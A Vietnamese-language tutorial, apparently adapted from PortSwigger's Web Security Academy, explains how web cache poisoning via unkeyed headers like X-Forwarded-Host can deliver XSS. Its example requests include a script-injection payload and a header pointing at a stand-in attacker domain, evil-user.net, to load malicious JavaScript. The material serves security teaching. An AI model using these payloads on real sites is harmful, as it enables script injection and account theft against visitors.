# Exploiting cache design flaws

Trong phần này, chúng ta sẽ xem xét kỹ hơn cách các lỗ hổng đầu độc bộ nhớ đệm web có thể phát sinh do các lỗi chung trong thiết kế bộ nhớ đệm. Chúng tôi cũng sẽ trình bày cách khai thác những lỗi này.

Tóm lại, các trang web dễ bị đầu độc bộ nhớ đệm web nếu chúng xử lý dữ liệu đầu vào không có khóa theo cách không an toàn và cho phép lưu trữ các phản hồi HTTP tiếp theo. Lỗ hổng này có thể được sử dụng làm phương thức phân phối cho nhiều cuộc tấn công khác nhau.

# Using web cache poisoning to deliver an XSS attack

Có lẽ lỗ hổng đầu độc bộ nhớ đệm web đơn giản nhất để khai thác là khi dữ liệu đầu vào không có khóa được phản ánh trong phản hồi có thể lưu vào bộ nhớ đệm mà không được khử trùng đúng cách.

Ví dụ, hãy xem xét yêu cầu và phản hồi sau:

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

Tại đây, giá trị của tiêu đề X-Forwarded-Host được sử dụng để tạo động URL hình ảnh Open Graph, sau đó được phản ánh trong phản hồi. Quan trọng đối với việc đầu độc bộ nhớ đệm web, tiêu đề X-Forwarded-Host thường không được khóa. Trong ví dụ này, bộ nhớ đệm có khả năng bị nhiễm độc bằng phản hồi chứa tải trọng XSS đơn giản:

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

Nếu phản hồi này được lưu trong bộ nhớ đệm, tất cả người dùng đã truy cập /en?region=uk sẽ được phục vụ tải trọng XSS này. Ví dụ này chỉ khiến cảnh báo xuất hiện trên trình duyệt của nạn nhân, nhưng một cuộc tấn công thực sự có khả năng đánh cắp mật khẩu và chiếm đoạt tài khoản người dùng.

# Using web cache poisoning to exploit unsafe handling of resource imports

Một số trang web sử dụng tiêu đề không có khóa để tạo URL động nhằm nhập tài nguyên, chẳng hạn như tệp JavaScript được lưu trữ bên ngoài. Trong trường hợp này, nếu kẻ tấn công thay đổi giá trị của tiêu đề thích hợp thành tên miền mà chúng kiểm soát, chúng có khả năng thao túng URL để trỏ đến tệp JavaScript độc hại của chúng.

Nếu phản hồi chứa URL độc hại này được lưu vào bộ nhớ đệm, tệp JavaScript của kẻ tấn công sẽ được nhập và thực thi trong phiên trình duyệt của bất kỳ người dùng nào có yêu cầu có khóa bộ nhớ đệm trùng khớp.

```http
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

--- 

## Ví dụ: Web cache poisoning with an unkeyed header

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header




























